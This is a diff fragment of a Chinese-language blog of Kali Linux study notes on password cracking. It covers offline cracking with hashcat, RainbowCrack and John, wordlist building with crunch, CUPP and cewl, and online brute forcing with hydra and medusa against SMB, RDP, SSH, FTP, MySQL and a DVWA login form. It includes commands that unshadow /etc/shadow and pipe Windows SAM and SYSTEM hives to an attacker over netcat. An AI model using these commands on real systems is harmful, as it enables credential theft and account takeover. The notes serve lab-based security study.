+<li><strong><code>🔺命令：apt-get purge samdump2</code></strong>（卸载高版本的samdump）</li>
+<li><strong><code>🔺命令：apt-get install libssl-dev</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：nc -nvlp 333 &gt; SYSTEM</code></strong>（攻击者的Kali）</li>
+<li><strong><code>🔺命令：nc IP地址 333 &lt; SYSTEM -q 1</code></strong>（Window上的Kali）</li>
+<li><strong><code>🔺命令：nc -nvlp 333 &gt; SAM</code></strong>（攻击者的Kali）</li>
+<li><strong><code>🔺命令：nc IP地址 333 &lt; SAM -q 1</code></strong>（Window上的Kali）</li>
+<li><strong><code>🔺命令：bkhive SYSTEM key</code></strong> </li>
+<li><strong><code>🔺命令：samdump2 SAM key</code></strong>（版本已更新，不再支持此功能）</li>
+</ul>
+</li>
+<li>建议使用 Kali 1.x（Kali 1.1版本可以实现）▲ 2020.1.26暂无可靠的Kali 1.x版本</li>
+</ul>
+<h4 id="6-Oclhashcat"><a href="#6-Oclhashcat" class="headerlink" title="6. Oclhashcat"></a>6. Oclhashcat</h4><ul>
+<li>号称世界上最快、唯一的基于GPGPU的密码破解软件 </li>
+<li>免费开源、支持多平台、支持分布式、150+hash算法</li>
+<li>硬件支持<ul>
+<li>虚拟机中无法使用 </li>
+<li>支持CUDA技术的Nvidia显卡 </li>
+<li>支持OpenCL技术的AMD显卡 </li>
+<li>安装相应的驱动</li>
+</ul>
+</li>
+<li>限制<ul>
+<li>最大密码长度55字符 </li>
+<li>使用Unicode的最大密码长度27字符</li>
+</ul>
+</li>
+<li>关于版本<ul>
+<li>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</li>
+<li>▲ 2020.1.26 Kali机子上只有hashcat，只支持有GPU的密码破解</li>
+</ul>
+</li>
+<li>命令<ul>
+<li><strong><code>🔺命令：oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</code></strong></li>
+</ul>
+</li>
+<li>通配符<ul>
+<li>?l = abcdefghijklmnopqrstuvwxyz </li>
+<li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ </li>
+<li>?d = 0123456789 </li>
+<li>?s =  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ </li>
+<li>?a = ?l?u?d?s </li>
+<li>?b = 0x00 - 0xff</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-RainbowCrack"><a href="#7-RainbowCrack" class="headerlink" title="7. RainbowCrack"></a>7. RainbowCrack</h4><ul>
+<li>基于时间记忆权衡技术生成彩虹表（保存计算好的密码字典）</li>
+<li>提前计算密码的HASH值，通过比对HASH值破解密码</li>
+<li>计算HASH的速度很慢，修改版支持CUDA GPU <ul>
+<li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li>
+</ul>
+</li>
+<li>KALI中包含RainbiwCrack工具<ul>
+<li>rtgen：预计算，生成彩虹表，耗时的阶段 </li>
+<li>rtsort：对rtgen生成的彩虹表进行排序 </li>
+<li>rcrack：查找彩虹表破解密码 </li>
+<li>以上命令必须顺序使用</li>
+</ul>
+</li>
+<li>彩虹表 <ul>
+<li>密码明文、HASH值、HASH算法、字符集、明文长度范围 </li>
+</ul>
+</li>
+<li>下载彩虹表<ul>
+<li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li>
+<li><a href="http://rainbowtables.shmoo.com/" target="_blank" rel="noopener">http://rainbowtables.shmoo.com/</a></li>
+</ul>
+</li>
+<li>生成彩虹表–rtgen <ul>
+<li>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160 </li>
+<li><strong><code>🔺命令：rtgen md5 loweralpha（使用的字符集） 1（最小长度） 5（最大长度） 0（表索引） 10000 10000 0</code></strong> </li>
+<li>计算彩虹表时间可能很长</li>
+</ul>
+</li>
+<li>彩虹表排序–rtsort<ul>
+<li><strong><code>🔺命令：cd /usr/share/rainbowcrack</code></strong> </li>
+<li><strong><code>🔺命令：rtsort /md5_loweralpha#1-5_0_1000x1000_0.rt</code></strong></li>
+</ul>
+</li>
+<li>密码破解–rcrack<ul>
+<li><strong><code>🔺命令：rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592</code></strong> </li>
+<li><strong><code>🔺命令：rcrack *.rt -l hash.txt</code></strong></li>
+</ul>
+</li>
+<li>▲ 2020.1.26自生成的彩虹表无法被找到</li>
+</ul>
+<h4 id="8-John"><a href="#8-John" class="headerlink" title="8. John"></a>8. John</h4><ul>
+<li>支持众多服务应用的加密破解 <ul>
+<li><strong><code>🔺命令：john --list=formats</code></strong></li>
+</ul>
+</li>
+<li>支持某些对称加密算法破解</li>
+<li>模式 <ul>
+<li>Wordlist：基于规则的字典破解 </li>
+<li>Single crack：默认被首先执行，使用Login/GECOS信息尝试破解 </li>
+<li>Incremental：所有或指定字符集的暴力破解 </li>
+<li>External：需要在主配配文件中用C语言子集编程</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐hashcat不支持对称加密算法的破解/john支持单向，对称，非对称加密算法破解
+⭐用户信息（GECOS信息，包括名字，电话等，在/etc/passwd中）
+1./etc/passwd存放账号的信息，/etc/shadow存放账号的密码信息
+2./bin/false → 不可用此账号登陆，/bin/bash → 可用此账号登陆
+⭐chin（可对用户GECOS信息进行修改）</code></pre></blockquote>
+<ul>
+<li>默认破解模式 <ul>
+<li>Single、wordlist、incremental（按顺序尝试三种模式）</li>
+<li>主配置文件中指定默认wordlist</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐[Options]（/etc/john/john.conf）
+#Default wordlist file name (including in batch mode)
+Wordlist=$JOHN/password.lst</code></pre></blockquote>
+<ul>
+<li>破解Linux系统账号密码 <ul>
+<li><strong><code>🔺命令：unshadow /etc/passwd /etc/shadow &gt; pass.txt</code></strong>（用户名密码文件的合并）</li>
+<li><strong><code>🔺命令：john pass.txt</code></strong> </li>
+<li><strong><code>🔺命令：john --show</code></strong> （密码保存在文件下）</li>
+<li>(.john）john.pot–密码保存/john.log–日志文件/john.rec–破解过程信息</li>
+</ul>
+</li>
+<li>破解windows密码 <ul>
+<li><strong><code>🔺命令：john sam.hash --wordlist=password.lst --format=nt</code></strong> </li>
+<li><strong><code>🔺命令：john sam.hash --format=nt --show</code></strong></li>
+</ul>
+</li>
+<li>Johnny图形化界面的John</li>
+</ul>
+<h4 id="9-Ophcrack（图形化界面）"><a href="#9-Ophcrack（图形化界面）" class="headerlink" title="9. Ophcrack（图形化界面）"></a>9. Ophcrack（图形化界面）</h4><ul>
+<li>基于彩虹表的LM、NTLM密码破解软件</li>
+<li>需要Load一个彩虹表，安装解压后的文件（官方网站下载彩虹表）</li>
+<li>彩虹表：<a href="http://ophcrack.sourceforge.net/tables.php" target="_blank" rel="noopener">http://ophcrack.sourceforge.net/tables.php</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/" itemprop="url">Kali Linux笔记(五十九)：密码破解--身份认证、字典</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:29+08:00">
+                2020-01-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1. 思路"></a>1. 思路</h4><ul>
+<li>目标系统实施了强安全措施<ul>
+<li>安装了所有补丁</li>
+<li>无任何已知漏洞</li>
+<li>无应用层漏洞</li>
+<li>攻击面最小化（端口最小化，利用化）</li>
+</ul>
+</li>
+<li>社会工程学</li>
+<li>获取目标系统用户身份<ul>
+<li>非授权用户不受信，认证用户可以访问守信资源</li>
+<li>已有用户账号权限受限，需要提权</li>
+<li>不会触发系统报警（非上传木马，用正常管理员登陆）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-身份认证方法"><a href="#2-身份认证方法" class="headerlink" title="2. 身份认证方法"></a>2. 身份认证方法</h4><ul>
+<li>证明你是你声称你是的那个人<ul>
+<li>你知道什么（账号密码、pin、passphrase）</li>
+<li>你有什么（令牌、token、key、证书、密宝、手机）</li>
+<li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别）</li>
+<li>以上方法结合使用（多因素身份认证）</li>
+</ul>
+</li>
+<li>基于互联网的身份认证仍以账号密码为主要形式</li>
+</ul>
+<h4 id="3-密码破解方法"><a href="#3-密码破解方法" class="headerlink" title="3. 密码破解方法"></a>3. 密码破解方法</h4><ul>
+<li>人工猜解<ul>
+<li>垃圾桶工程</li>
+<li>被动信息收集</li>
+</ul>
+</li>
+<li>基于字典暴力破解（主流）</li>
+<li>键盘空间字符爆破</li>
+<li>字典<ul>
+<li>保存有用户和密码的文本文件</li>
+<li>/usr/share/wordlist</li>
+<li>/usr/share/wfuzz/wordlist</li>
+<li>/usr/share/seclists</li>
+<li>▲ rockyou.txt</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-字典–Crunch"><a href="#4-字典–Crunch" class="headerlink" title="4. 字典–Crunch"></a>4. 字典–Crunch</h4><ul>
+<li>键盘空间字符爆破<ul>
+<li>全键盘空间字符</li>
+<li>部分键盘空间字符（基于规则）</li>
+<li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li>
+</ul>
+</li>
+<li>crunch <min-len><max-len>[<charset string>][options]<ul>
+<li><charset string>默认是小写字符</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100</code></strong><ul>
+<li>-b（按大小分割【kb/kib、mb/mib、gb/gib】）kb、mb、gb → 1000/kib、mib、gib → 1024</li>
+<li>-c（每个字典的行数）</li>
+<li>以上两个参数必须与-o START结合使用</li>
+<li>-d（同一字符连贯出现数量【11/aaa】）</li>
+</ul>
+</li>
+<li>字符集<ul>
+<li><strong><code>🔺命令：cat /usr/share/crunch/charset.lst</code></strong></li>
+<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></strong></li>
+</ul>
+</li>
+<li>无重复字符集<ul>
+<li><strong><code>🔺命令：crunch 1 1 -p（指定字符作为生成字符） 1234567890 | more</code></strong></li>
+<li>必须是最后一个参数</li>
+<li>最大、最小字符长度失效，但必须存在</li>
+<li>与-s参数不兼容（-s指定起始字符串）</li>
+<li><strong><code>🔺命令：crunch 4 4 0123456789 -s 9900</code></strong></li>
+</ul>
+</li>
+<li>读取文件中每行内容作为基本字符生成字典<ul>
+<li><strong><code>🔺命令：crunch 1 1 -q</code></strong> read（文件中每段简单设置为一个字符，然后进行拼接调换）</li>
+<li>最小、最大字符长度失效，但必须存在</li>
+<li>每段在生成的字典文件中，每行只出现一次（4行文件=4<em>3</em>2*1=24行字典）</li>
+</ul>
+</li>
+<li>字典组成规则<ul>
+<li><strong><code>🔺命令：crunch 6 6 -t @,%%^^ | more</code></strong></li>
+<li>@：小写字母 lalpha</li>
+<li>,：大写字母 ualpha</li>
+<li>%：数字 numeric</li>
+<li>^：符号 symbols</li>
+</ul>
+</li>
+<li>输出文件压缩<ul>
+<li><strong><code>🔺命令：crunch 4 4 -t @,%^ -o 1.txt -z 7z</code></strong></li>
+<li>其他压缩格式：gzip、bzip2、lzma</li>
+<li>-7z压缩比率最大</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lsb mixalpha-numeric-all-space -o w.txt -t @d@@ -s cdab</code></strong>（@表示字符集所有组合，特殊情况）</li>
+<li><strong><code>🔺命令：crunch 4 5 -p dog cat bird</code></strong>（后面三个词语是为三个基本字符）</li>
+<li><strong><code>🔺命令：crunch 5 5 abc DEF + \!@# -t ,@^%,</code></strong> （从指定的字符中挑选）<ul>
+<li><ul>
+<li>占位符（表示所有）</li>
+</ul>
+</li>
+<li>\ 转义符（空格、符号）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：crunch 5 5 -t ddd%% -p dog cat bird</code></strong><ul>
+<li>任何不同于-p 参数指定的值都是占位符</li>
+<li>d无效，不同于-p </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：crunch 5 5 -d 2@ -t @@@%%</code></strong>（小写字母不能超过两个连续相同）</li>
+<li>组合应用（边生成边使用边丢弃）<ul>
+<li><strong><code>🔺命令：crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –</code></strong></li>
+<li><strong><code>🔺命令：crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd -</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="5-字典–CUPP"><a href="#5-字典–CUPP" class="headerlink" title="5. 字典–CUPP"></a>5. 字典–CUPP</h4><ul>
+<li>按个人信息生成其专属的密码字典（适合破解个人信息的个人账号密码）</li>
+<li>CUPP：Common User Password Profiler<ul>
+<li><strong><code>🔺命令：git clone https://github.com/Mebus.cupp.git</code></strong></li>
+<li><strong><code>🔺命令：python cupp.py -i</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="6-字典–cewl"><a href="#6-字典–cewl" class="headerlink" title="6. 字典–cewl"></a>6. 字典–cewl</h4><ul>
+<li>通过收集网站信息生成字典</li>
+<li><strong><code>🔺命令：cewl 1.1.1.1（或域名） -m 3 -d 3 -e -c -v -w a.txt</code></strong><ul>
+<li>-m（最小单词长度）</li>
+<li>-d（爬网深度）</li>
+<li>-e（收集包含email地址信息）</li>
+<li>-c（每个单词出现次数）</li>
+<li>支持基本、摘要身份认证</li>
+<li>支持代理</li>
+</ul>
+</li>
+<li>用户密码变型<ul>
+<li>基于cewl得结果进行密码变型</li>
+<li>末尾增加数字串</li>
+<li>字母大小写变化</li>
+<li>字母与符号相互转换</li>
+<li>字母与数字相互转换</li>
+<li>P@$$w0ord</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-字典–John-the-Ripper"><a href="#7-字典–John-the-Ripper" class="headerlink" title="7. 字典–John the Ripper"></a>7. 字典–John the Ripper</h4><ul>
+<li>使用John the Ripper配置文件实现密码动态变型</li>
+<li>/etc/john/john.conf<ul>
+<li>[List.Rules:Wordlist]</li>
+<li>$[0-9]$[0-9]$[0-9]</li>
+<li><strong><code>🔺命令：cat a.txt | head -n 10 | cut -d &quot;,&quot; -f 1 &gt;  p.lst</code></strong>（a.txt为cewl生成的文件）</li>
+<li><strong><code>🔺命令：john --wordlist=p.lst --rules --stdout &gt; m.txt</code></strong></li>
+<li><strong><code>🔺命令：wc -l m.txt</code></strong>（查看m.txt里面有多少条记录）<br>– [List.Rules:test] $[0-9]$[0-9]$[0-9]$[a-zA-Z] $[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[<code>~!@#$%^&amp;*()\-_=+]
+– **</code>🔺命令：john –wordlist=cewl.txt –rules=test –stdout &gt; m.txt<code>**
+– **</code>🔺命令：john –wordlist=ahm.lst –rules=test HASHFILE`**</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url">Kali Linux笔记(六十)：在线密码破解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:23+08:00">
+                2020-01-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-hydra（稳定性可能较差）"><a href="#1-hydra（稳定性可能较差）" class="headerlink" title="1. hydra（稳定性可能较差）"></a>1. hydra（稳定性可能较差）</h4><ul>
+<li>在线密码破解–对在线服务的密码破解</li>
+<li>离线密码破解–非在线服务的密码破解</li>
+<li>Hydra<ul>
+<li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li>
+<li>-vV（查看详细信息）</li>
+<li>-t（并发连接数）</li>
+<li>-e nsr（’n’ → 空字符，’s’ → 账号和密码相同，’r’ → ‘调换账号和密码’）</li>
+<li>-s（非默认输入端口）</li>
+<li>-L（自定义密码文件）</li>
+<li>-P（系统密码文件）</li>
+</ul>
+</li>
+<li>Windows密码破解<ul>
+<li>window2003设置密码，开启远程桌面（net share查看共享文件）</li>
+<li><strong><code>🔺命令：hydra -l administartor -P pass.lst smb://1.1.1.1 -vV</code></strong></li>
+<li><strong><code>🔺命令：hydra -l administartor -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></strong></li>
+</ul>
+</li>
+<li>Linux密码破解<ul>
+<li>设置Metasploitable的root登陆密码（sudo passwd root）</li>
+<li><strong><code>🔺命令：hydra -l root -P pass.lst ssh://1.1.1.1 -vV</code></strong></li>
+<li>▲ 日志服务器的报警</li>
+</ul>
+</li>
+<li>其他服务密码破解<ul>
+<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址</code></strong>（是否开启）</li>
+<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址 -sV</code></strong>（开启的服务）</li>
+<li><strong><code>🔺命令：hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></strong></li>
+</ul>
+</li>
+<li>图形化界面<ul>
+<li><strong><code>🔺命令：xhydra</code></strong>（旧版本为hydra-gtk）</li>
+<li><strong><code>🔺命令：ftp 1.1.1.1</code></strong>（Metasploitable的21端口ftp服务配置错误，只要用户名正确，无密码）</li>
+</ul>
+</li>
+<li>HTTP表单身份认证<ul>
+<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -V</code></strong> </li>
+<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed&quot; -V</code></strong></li>
+<li>特征字符非Login Failed，为index.php，特征字符可以位于header中，也可以位于body</li>
+<li>/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:Foo<ul>
+<li>C：先访问指定页面取得cookie </li>
+<li>H：指定http头</li>
+</ul>
+</li>
+<li>https-post-form、https-get-form、https-get-form</li>
+<li>-S:使用SSL连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-pw-inspector"><a href="#2-pw-inspector" class="headerlink" title="2. pw-inspector"></a>2. pw-inspector</h4><ul>
+<li>pw-inspector<ul>
+<li>按长度和字符集筛选字典</li>
+<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l</code></strong>（小写字母筛选）</li>
+<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></strong>（大写字母筛选）</li>
+<li>-m（最小位数）</li>
+<li>-M（最大位数）</li>
+</ul>
+</li>
+<li>密码破解效率<ul>
+<li>密码复杂度（字典命中率）</li>
+<li>带宽、协议、服务器性能、客户端性能</li>
+<li>锁定阈值</li>
+<li>单位时间最大登陆请求次数</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-medusa"><a href="#3-medusa" class="headerlink" title="3. medusa"></a>3. medusa</h4><ul>
+<li>Hydra的缺点<ul>
+<li>稳定性差，程序时常崩溃</li>
+<li>速度控制不好，容易触发服务屏蔽或锁死机制</li>
+<li>每主机新建过程，每服务新建实例</li>
+<li>大量目标破解时性能差</li>
+<li>▲ 对CPU以及存储空间占用较大</li>
+</ul>
+</li>
+<li>Medusa的特点<ul>
+<li>稳定性好（单主机、多主机）</li>
+<li>速度控制得当</li>
+<li>基于线程</li>
+<li>支持模块少于hydra（不支持RDP）</li>
+<li>WEB-Form支持存在缺陷（只支持失败获得的信息，且只支持200响应代码的页面）</li>
+</ul>
+</li>
+<li>常用参数<ul>
+<li><strong><code>🔺命令：mdeusa -d</code></strong>（查看支持的模块）</li>
+<li><strong><code>🔺命令：medusa -M</code></strong>（选择的模块）</li>
+<li><strong><code>🔺命令：medusa -M 模块 -q</code></strong>（查看模块详细参数）</li>
+<li>-m（大模块相应的参数）    </li>
+<li>-h IP地址（选择的主机）-u 用户（指定用户）、-P 密码（指定密码文件）</li>
+<li>-e（n/s/ns）（同hydra，但缺少参数r）</li>
+<li>-F（获取一个即停止）</li>
+<li>-T 数字（并发主机数）</li>
+<li>-v 数字（显示破解过程的详细信息程度）</li>
+<li>-n 端口（使用端口）</li>
+<li>-s （使用SSL连接）</li>
+</ul>
+</li>
+<li>破解Windows密码<ul>
+<li><strong><code>🔺命令：net user administrator zipper</code></strong></li>
+<li><strong><code>🔺命令：medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></strong></li>
+</ul>
+</li>
+<li>破解Linux SSH密码（Metasploit）<ul>
+<li><strong><code>🔺命令：cat /usr/share/wordlists/nmap.lst | grep -v \# &gt; pass.lst</code></strong></li>
+<li><strong><code>🔺命令：medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></strong></li>
+</ul>
+</li>
+<li>其他服务密码破解<ul>
+<li><strong><code>🔺命令：medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F</code></strong></li>
+<li><strong><code>🔺命令：medusa -M ftp -h 1.1.1.1 -u ftp -P pass.lst -e ns -F</code></strong></li>
+<li><strong><code>🔺命令：medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</code></strong> ▲ 2020.1.25实验无法破解密码</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-在线密码破解"><a href="#4-在线密码破解" class="headerlink" title="4. 在线密码破解"></a>4. 在线密码破解</h4><ul>
+<li>网站的在线密码破解</li>
+<li>MD5：<a href="https://cmd5.com/" target="_blank" rel="noopener">https://cmd5.com/</a></li>
+<li>多种Hash值：<a href="https://1024tools.com/hash" target="_blank" rel="noopener">https://1024tools.com/hash</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1004,2667 +3569,11 @@ Hacker：CDN劫持，在CDN节点上插入js脚本</code></pre></blockquote>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
